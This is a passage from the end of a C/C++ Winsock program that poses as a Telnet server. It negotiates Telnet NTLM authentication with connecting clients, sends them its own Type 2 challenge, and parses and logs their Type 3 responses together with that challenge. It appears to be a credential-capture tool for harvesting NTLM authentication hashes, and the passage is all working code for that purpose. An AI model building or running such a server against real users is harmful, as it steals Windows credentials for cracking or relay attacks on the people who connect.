            printf("recv failed for Frame 7: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        } else if (bytesReceived == 0) {
            printf("Connection closed by client during Frame 7\n");
            closesocket(clientSocket);
            continue;
        }
        printf("Received Frame 7 (%d bytes): ", bytesReceived);
        print_hex(buffer, bytesReceived);

        unsigned char frame8[] = {IAC, SB, TO_NEWENV, 0x01, IAC, SE, IAC, SB, TO_NEWENV, 0x01, 0x03, 'S', 'F', 'U', 'T', 'L', 'N', 'T', 'V', 'E', 'R', 0x03, 'S', 'F', 'U', 'T', 'L', 'N', 'T', 'M', 'O', 'D', 'E', IAC, SE};
        if (send(clientSocket, (char*)frame8, sizeof(frame8), 0) == SOCKET_ERROR) {
            printf("send failed for Frame 8: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        }
        printf("Sent Frame 8\n");

        bytesReceived = recv(clientSocket, (char*)buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR) {
            printf("recv failed for Frame 9: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        } else if (bytesReceived == 0) {
            printf("Connection closed by client during Frame 9\n");
            closesocket(clientSocket);
            continue;
        }
        printf("Received Frame 9 - NTLM Type 1 (%d bytes): ", bytesReceived);
        print_hex(buffer, bytesReceived);
        std::vector<unsigned char> data9(buffer, buffer + bytesReceived);
        std::vector<unsigned char> ntlm_message9 = extract_ntlm_message(data9);
        if (!ntlm_message9.empty()) {
            parse_ntlm_type1(log, ntlm_message9);
        } else {
            printf("No NTLM Type 1 message extracted from Frame 9\n");
            fprintf(log, "No NTLM Type 1 message extracted from Frame 9\n");
            fflush(log);
        }

        bytesReceived = recv(clientSocket, (char*)buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR) {
            printf("recv failed for Frame 10: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        } else if (bytesReceived == 0) {
            printf("Connection closed by client during Frame 10\n");
            closesocket(clientSocket);
            continue;
        }
        printf("Received Frame 10 - Environment Variables (%d bytes): ", bytesReceived);
        print_hex(buffer, bytesReceived);
        std::vector<unsigned char> data10(buffer, buffer + bytesReceived);
        parse_environment_variables(log, data10);

        printf("Preparing to send Frame 11\n");
        std::vector<unsigned char> frame11 = create_type2_frame(log, domain, server, challenge);
        // Remove the redundant initialization of global_challenge here since it's now set in create_type2_frame
        current_challenge = global_challenge;
        printf("Sending Frame 11 - NTLM Type 2 (%d bytes): ", (int)frame11.size());
        print_hex(frame11.data(), frame11.size());
        std::vector<unsigned char> ntlm_type2 = extract_ntlm_message(frame11);
        if (!ntlm_type2.empty()) {
            parse_ntlm_type2(log, ntlm_type2);
        } else {
            printf("No NTLM Type 2 message extracted from Frame 11\n");
            fprintf(log, "No NTLM Type 2 message extracted from Frame 11\n");
            fflush(log);
        }
        if (send(clientSocket, (char*)frame11.data(), frame11.size(), 0) == SOCKET_ERROR) {
            printf("send failed for Frame 11: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        }
        printf("Sent Frame 11\n");

        bytesReceived = recv(clientSocket, (char*)buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR) {
            printf("recv failed for Frame 12: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        } else if (bytesReceived == 0) {
            printf("Connection closed by client during Frame 12\n");
            closesocket(clientSocket);
            continue;
        }
        printf("Received Frame 12 - NTLM Type 3 (%d bytes): ", bytesReceived);
        print_hex(buffer, bytesReceived);
        std::vector<unsigned char> data12(buffer, buffer + bytesReceived);
        std::vector<unsigned char> ntlm_message12 = extract_ntlm_message(data12);
        if (!ntlm_message12.empty()) {
            parse_ntlm_type3(log, ntlm_message12, current_challenge);
        } else {
            printf("No NTLM Type 3 message extracted from Frame 12\n");
            fprintf(log, "No NTLM Type 3 message extracted from Frame 12\n");
            fflush(log);
        }

        unsigned char frame15[] = {IAC, SB, TO_AUTH, 0x02, 0x0F, 0x00, 0x03, IAC, SE, IAC, 0xFD, 0x18};
        if (send(clientSocket, (char*)frame15, sizeof(frame15), 0) == SOCKET_ERROR) {
            printf("send failed for Frame 15: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        }
        printf("Sent Frame 15\n");

        closesocket(clientSocket);
        printf("Connection closed.\n");
    }

    closesocket(serverSocket);
    WSACleanup();
    fclose(log);
    return 0;
}